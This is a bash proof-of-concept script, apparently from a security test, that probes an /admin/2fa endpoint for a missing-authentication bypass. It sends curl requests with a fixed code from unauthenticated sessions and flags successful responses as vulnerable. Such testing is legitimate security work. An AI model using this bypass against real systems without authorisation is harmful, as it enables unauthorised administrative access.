#!/bin/bash

# POC: Missing Authentication State Validation on 2FA Endpoint
# This script demonstrates that the /admin/2fa endpoint accepts 2FA code submissions
# without any prior authentication, completely bypassing the authentication state validation

TARGET_URL="${1:-http://localhost:5000}"
COOKIE_JAR=$(mktemp)
trap "rm -f $COOKIE_JAR" EXIT

echo "=========================================="
echo "Testing: Missing Auth State Validation on 2FA"
echo "Target: $TARGET_URL/admin/2fa"
echo "=========================================="
echo

# Test 1: Access /admin/2fa from completely fresh/unauthenticated session
echo "[TEST 1] Accessing /admin/2fa from fresh/unauthenticated session"
echo "Expected: Should redirect to login or deny access"
echo "Actual:"
response=$(curl -s -w "\nHTTP_CODE:%{http_code}" -c "$COOKIE_JAR" "$TARGET_URL/admin/2fa")
http_code=$(echo "$response" | grep "HTTP_CODE:" | cut -d: -f2)
body=$(echo "$response" | sed '/HTTP_CODE:/d')
echo "HTTP Status: $http_code"
echo "Response contains 2FA form: $(echo "$body" | grep -q 'code' && echo 'YES (VULNERABLE!)' || echo 'NO')"
echo "Response length: $(echo "$body" | wc -c) characters"
echo

# Test 2: POST 2FA code from unauthenticated session
echo "[TEST 2] Submitting 2FA code=1234 from unauthenticated session"
echo "Expected: Should deny - user not authenticated"
echo "Actual:"
response=$(curl -s -w "\nHTTP_CODE:%{http_code}" \
  -b "$COOKIE_JAR" \
  -c "$COOKIE_JAR" \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"code": "1234"}' \
  "$TARGET_URL/admin/2fa")
http_code=$(echo "$response" | grep "HTTP_CODE:" | cut -d: -f2)
body=$(echo "$response" | sed '/HTTP_CODE:/d')
echo "HTTP Status: $http_code"
echo "Response: $body"
success_match=$(echo "$body" | grep -i '"success"' | grep -i 'true')
if [ -n "$success_match" ]; then
  echo "VULNERABLE: 2FA code accepted without authentication! Response contains success=true"
fi
echo

# Test 3: Verify no session authentication occurred - make multiple requests
echo "[TEST 3] Multiple consecutive unauthenticated 2FA requests"
echo "Expected: Should fail/timeout after certain attempts"
echo "Actual:"
success_count=0
for i in {1..3}; do
  response=$(curl -s -w "\nHTTP_CODE:%{http_code}" \
    -b "$COOKIE_JAR" \
    -c "$COOKIE_JAR" \
    -X POST \
    -H "Content-Type: application/json" \
    -d '{"code": "1234"}' \
    "$TARGET_URL/admin/2fa")
  http_code=$(echo "$response" | grep "HTTP_CODE:" | cut -d: -f2)
  body=$(echo "$response" | sed '/HTTP_CODE:/d')
  if echo "$body" | grep -q '"success".*true'; then
    ((success_count++))
    echo "Request $i: HTTP $http_code - SUCCESS (VULNERABLE!)"
  else
    echo "Request $i: HTTP $http_code - FAILED"
  fi
done
echo "Result: $success_count/3 unauthenticated requests succeeded"
if [ "$success_count" -eq 3 ]; then
  echo "CRITICAL VULNERABILITY: All unauthenticated 2FA submissions succeeded!"
fi
echo

# Test 4: Verify no authentication headers/tokens required
echo "[TEST 4] Testing with completely new cookie jar (simulating different attacker)"
NEW_COOKIE_JAR=$(mktemp)
trap "rm -f $NEW_COOKIE_JAR" EXIT
echo "Expected: Should fail - completely new, unauthenticated request"
echo "Actual:"
response=$(curl -s -w "\nHTTP_CODE:%{http_code}" \
  -b "$NEW_COOKIE_JAR" \
  -c "$NEW_COOKIE_JAR" \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"code": "1234"}' \
  "$TARGET_URL/admin/2fa")
http_code=$(echo "$response" | grep "HTTP_CODE:" | cut -d: -f2)
body=$(echo "$response" | sed '/HTTP_CODE:/d')
echo "HTTP Status: $http_code"
echo "Response: $body"
if echo "$body" | grep -q '"success".*true'; then
  echo "CRITICAL VULNERABILITY: Brand new unauthenticated session can validate 2FA codes!"
fi
echo

# Test 5: Verify we can skip normal login flow entirely
echo "[TEST 5] Bypassing login flow - direct 2FA code submission"
echo "Attack scenario: Attacker never logs in, directly submits 2FA code"
echo "Expected: Should require login first"
echo "Actual:"
rm "$COOKIE_JAR"
COOKIE_JAR=$(mktemp)
trap "rm -f $COOKIE_JAR" EXIT

response=$(curl -s -w "\nHTTP_CODE:%{http_code}" \
  -b "$COOKIE_JAR" \
  -c "$COOKIE_JAR" \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"code": "1234"}' \
  "$TARGET_URL/admin/2fa")
http_code=$(echo "$response" | grep "HTTP_CODE:" | cut -d: -f2)
body=$(echo "$response" | sed '/HTTP_CODE:/d')
echo "HTTP Status: $http_code"
echo "Response: $body"
if echo "$body" | grep -q '"success".*true'; then
  echo "CRITICAL VULNERABILITY: Login flow completely bypassed!"
fi
echo

echo "=========================================="
echo "Summary: If 2FA codes are accepted without"
echo "prior authentication, this is a critical"
echo "authentication bypass vulnerability."
echo "=========================================="